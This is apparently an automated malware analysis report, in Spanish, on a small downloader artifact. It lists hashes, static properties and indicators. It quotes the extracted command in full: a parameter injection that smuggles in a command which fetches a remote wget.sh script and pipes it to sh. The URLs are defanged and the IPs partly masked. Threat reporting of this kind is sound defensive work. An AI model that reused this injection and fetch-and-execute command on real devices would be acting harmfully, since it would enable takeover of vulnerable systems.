# 🧬 Payload Analysis

`6ebdfc0c8949fa8a725e273eb4a865e9233f5f038a7a77edbb60a3f327718f6a`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 324 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6ebdfc0c8949fa8a725e273eb4a865e9233f5f038a7a77edbb60a3f327718f6a`
- **MD5:** `7c9e48d69f698a4f1299cda152c7236a`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 324 B |
| Entropía | 5.11 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
sz11gChannel=1`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr1;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | sz11gChannel=1`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr1;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh - | strings |
| hash | 6ebdfc0c8949fa8a725e273eb4a865e9233f5f038a7a77edbb60a3f327718f6a | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
